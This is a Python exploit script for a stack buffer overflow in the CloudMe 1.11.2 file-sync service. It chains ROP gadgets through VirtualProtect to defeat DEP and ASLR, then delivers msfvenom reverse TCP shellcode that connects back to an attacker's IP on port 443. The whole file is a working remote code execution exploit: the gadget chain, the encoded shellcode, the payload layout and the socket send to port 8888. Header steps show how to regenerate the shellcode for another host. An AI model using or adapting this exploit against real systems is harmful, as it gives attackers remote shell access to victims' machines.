# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (SEH,DEP,ASLR)
# Date: 2020-05-20
# Exploit Author: Xenofon Vassilakopoulos
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 7 Professional x86 SP1

# Steps to reproduce:
# 1. On your local machine start the CloudMe service.
# 2. change the reverse tcp shellcode using the IP and Port of your host using the following command
# msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
# 3. Run the python script.


import struct
import socket

target = "127.0.0.1"

########################################################################

# Get kernel32 address from the stack
# 0022ff8c  77883c45 kernel32!BaseThreadInitThunk+0xe

rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
rop+= struct.pack('L',0x0385FF88) # Offset
rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x0362fffc) # Offset
rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]

# Calculate VirtualProtect relative to the leaked kernel32 address

rop+= struct.pack('L',0x68a812c9) # POP EBP # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xfffae493) # Offset
rop+= struct.pack('L',0x61ba8137) # ADD EAX,EBP # RETN [Qt5Gui.dll]

########################################################################

# Setup VirtualProtect

# edi
rop+= struct.pack('L',0x6d9c23ab) # POP EDI # RETN [Qt5Sql.dll]
rop+= struct.pack('L',0x6d9c1011) # RETN (ROP NOP) [Qt5Sql.dll]

# esi
rop+= struct.pack('L',0x61b63b3c) # XCHG EAX, ESI # RETN # ptr to virtualprotect

# edx
rop+= struct.pack('L',0x68d327ff) # POP EAX # POP ECX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xffffffc0) # Value to negate, will become 0x00000040
rop+= struct.pack('L',0x41414141) # Filler
rop+= struct.pack('L',0x68cef5b2) # NEG EAX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0x68b1df17) # XCHG EAX,EDX # RETN [Qt5Core.dll]

# ebx
rop+= struct.pack('L',0x68ae7ee3) # POP EAX # RETN [Qt5Core.dll]
rop+= struct.pack('L',0xfffffdff) # Value to negate, will become 0x00000201
rop+= struct.pack('L',0x6d9e431a) # NEG EAX # RETN [Qt5Sql.dll]
rop+= struct.pack('L',0x68aad07c) # XCHG EAX,EBX # RETN [Qt5Core.dll]

# ebp
rop+= struct.pack('L',0x6d9c12c9) # POP EBP # RETN [Qt5Sql.dll]
rop+= struct.pack('L',0x6d9c12c9) # skip 4 bytes 

# eax & ecx
rop+= struct.pack('L',0x6fe4dc57) # POP EAX # POP ECX # RETN [libstdc++-6.dll]
rop+= struct.pack('L',0x90909090) # NOP      
rop+= struct.pack('L',0x68ee6b16) # &Writable location [Qt5Core.dll]

# push registers to stack
rop+= struct.pack('L',0x68ef1b07) # PUSHAD # RETN [Qt5Core.dll]

rop+= struct.pack('L',0x64b4d6cd) # JMP ESP [libwinpthread-1.dll]


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.6 LPORT=443 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
buf =  b""
buf += b"\xdb\xd9\xb8\x06\x6f\x1f\xc5\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13\x03\x45\x7c\xfd"
buf += b"\x30\xb5\x6a\x83\xbb\x45\x6b\xe4\x32\xa0\x5a\x24\x20"
buf += b"\xa1\xcd\x94\x22\xe7\xe1\x5f\x66\x13\x71\x2d\xaf\x14"
buf += b"\x32\x98\x89\x1b\xc3\xb1\xea\x3a\x47\xc8\x3e\x9c\x76"
buf += b"\x03\x33\xdd\xbf\x7e\xbe\x8f\x68\xf4\x6d\x3f\x1c\x40"
buf += b"\xae\xb4\x6e\x44\xb6\x29\x26\x67\x97\xfc\x3c\x3e\x37"
buf += b"\xff\x91\x4a\x7e\xe7\xf6\x77\xc8\x9c\xcd\x0c\xcb\x74"
buf += b"\x1c\xec\x60\xb9\x90\x1f\x78\xfe\x17\xc0\x0f\xf6\x6b"
buf += b"\x7d\x08\xcd\x16\x59\x9d\xd5\xb1\x2a\x05\x31\x43\xfe"
buf += b"\xd0\xb2\x4f\x4b\x96\x9c\x53\x4a\x7b\x97\x68\xc7\x7a"
buf += b"\x77\xf9\x93\x58\x53\xa1\x40\xc0\xc2\x0f\x26\xfd\x14"
buf += b"\xf0\x97\x5b\x5f\x1d\xc3\xd1\x02\x4a\x20\xd8\xbc\x8a"
buf += b"\x2e\x6b\xcf\xb8\xf1\xc7\x47\xf1\x7a\xce\x90\xf6\x50"
buf += b"\xb6\x0e\x09\x5b\xc7\x07\xce\x0f\x97\x3f\xe7\x2f\x7c"
buf += b"\xbf\x08\xfa\xd3\xef\xa6\x55\x94\x5f\x07\x06\x7c\xb5"
buf += b"\x88\x79\x9c\xb6\x42\x12\x37\x4d\x05\x17\xc2\x43\x89"
buf += b"\x4f\xd0\x5b\x20\xcc\x5d\xbd\x28\xfc\x0b\x16\xc5\x65"
buf += b"\x16\xec\x74\x69\x8c\x89\xb7\xe1\x23\x6e\x79\x02\x49"
buf += b"\x7c\xee\xe2\x04\xde\xb9\xfd\xb2\x76\x25\x6f\x59\x86"
buf += b"\x20\x8c\xf6\xd1\x65\x62\x0f\xb7\x9b\xdd\xb9\xa5\x61"
buf += b"\xbb\x82\x6d\xbe\x78\x0c\x6c\x33\xc4\x2a\x7e\x8d\xc5"
buf += b"\x76\x2a\x41\x90\x20\x84\x27\x4a\x83\x7e\xfe\x21\x4d"
buf += b"\x16\x87\x09\x4e\x60\x88\x47\x38\x8c\x39\x3e\x7d\xb3"
buf += b"\xf6\xd6\x89\xcc\xea\x46\x75\x07\xaf\x77\x3c\x05\x86"
buf += b"\x1f\x99\xdc\x9a\x7d\x1a\x0b\xd8\x7b\x99\xb9\xa1\x7f"
buf += b"\x81\xc8\xa4\xc4\x05\x21\xd5\x55\xe0\x45\x4a\x55\x21"

##########

junk1 = "\x41"*1604

nops = "\x90"*16

junk2 = "C"*(2236 - len(nops) - len(buf) - len(rop) - len(junk1))

seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN  [Qt5Network.dll] 

payload = junk1 + rop + nops + buf + junk2 + seh 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except Exception as e:
	print(sys.exc_value)
